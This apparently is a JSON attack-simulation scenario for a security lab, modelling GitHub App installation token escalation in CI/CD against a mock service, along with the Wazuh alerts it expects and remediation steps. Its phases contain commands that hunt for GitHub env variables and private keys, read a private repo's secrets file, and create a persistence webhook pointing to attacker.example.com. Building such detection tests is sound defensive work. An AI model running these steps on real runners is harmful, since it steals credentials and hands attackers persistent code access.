@@ -1,0 +1,153 @@
+{
+  "id": "S9-05",
+  "name": "GitHub App Installation Token Escalation",
+  "category": "Supply Chain",
+  "version": "1.0",
+  "description": "Attacker escalates a GitHub App installation token to access repositories and resources beyond the intended scope by exploiting overpermissioned app installations",
+  "difficulty": "Expert",
+  "real_world_relevance": "GitHub App token abuse in CI/CD pipelines, Dependabot token escalation CVE-2024-1482, Renovate bot token scope concerns, numerous GitHub App permission misconfiguration disclosures",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1528", "name": "Steal Application Access Token"},
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cloud_net",
+    "profile": "cicd"
+  },
+
+  "attack_flow": {
+    "description": "Attacker obtains a GitHub App installation token and exploits its permissions to access repos beyond what the workflow should access",
+    "diagram": [
+      "1. Attacker extracts GitHub App private key or installation token from CI runner",
+      "2. Generates new installation access token with full app permissions",
+      "3. Uses token to enumerate accessible repositories",
+      "4. Accesses private repos, secrets, and environments beyond workflow scope",
+      "5. Creates new app installations or modifies existing permissions"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Token Discovery",
+      "description": "Locate GitHub App tokens and private keys in the runner environment",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -i GITHUB 2>/dev/null || echo 'No GitHub env vars'",
+          "description": "Enumerate GitHub-related environment variables"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "find /runner -name '*.pem' -o -name 'github-app-key*' 2>/dev/null | head -5 || echo 'No GitHub App private keys found'",
+          "description": "Search for GitHub App private key files"
+        }
+      ]
+    },
+    {
+      "name": "Installation Token Generation",
+      "description": "Generate a new installation access token with escalated scope",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens -H 'Authorization: Bearer ghs_FAKE_JWT_TOKEN' -H 'Accept: application/vnd.github+json' 2>/dev/null | python3 -m json.tool || echo 'Token generation failed'",
+          "description": "Request new installation token with full permissions"
+        }
+      ]
+    },
+    {
+      "name": "Scope Escalation",
+      "description": "Use the token to access repos beyond intended scope",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s http://mock-cicd:8080/github/installation/repositories -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' 2>/dev/null || echo 'Repo enumeration simulated'",
+          "description": "Enumerate all repositories accessible via installation token"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s http://mock-cicd:8080/github/repos/org/private-repo/contents/secrets.yml -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' 2>/dev/null || echo 'Private repo access simulated'",
+          "description": "Access private repository contents beyond workflow scope"
+        }
+      ]
+    },
+    {
+      "name": "Persistence via App Manipulation",
+      "description": "Modify app permissions or create webhooks for persistence",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-cicd:8080/github/repos/org/target-repo/hooks -H 'Authorization: token ghs_FAKE_INSTALLATION_TOKEN' -d '{\"url\": \"https://attacker.example.com/webhook\", \"events\": [\"push\"]}' 2>/dev/null || echo 'Webhook creation simulated'",
+          "description": "Create malicious webhook for persistent code access"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "API Logs",
+      "description": "GitHub App token scope escalation attempt",
+      "wazuh_rule": "100986"
+    },
+    {
+      "type": "API Logs",
+      "description": "GitHub App accessing repos beyond installation scope",
+      "wazuh_rule": "100987"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100986",
+      "level": 13,
+      "description": "NHI: GitHub App token scope escalation attempt"
+    },
+    {
+      "rule_id": "100987",
+      "level": 14,
+      "description": "NHI: GitHub App accessing repos beyond installation scope"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke the compromised GitHub App installation token",
+      "Rotate the GitHub App private key",
+      "Audit all API calls made with the escalated token"
+    ],
+    "long_term": [
+      "Apply principle of least privilege to GitHub App permissions",
+      "Use fine-grained personal access tokens instead of App tokens where possible",
+      "Implement IP allowlisting for GitHub App API access",
+      "Monitor for unusual repository access patterns via GitHub audit log",
+      "Use repository rulesets to restrict webhook creation"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub App Permissions Reference",
+      "url": "https://docs.github.com/en/rest/overview/permissions-required-for-github-apps"
+    },
+    {
+      "title": "Legit Security - GitHub App Token Risks",
+      "url": "https://www.legitsecurity.com/blog/github-app-tokens-risks"
+    }
+  ]
+}
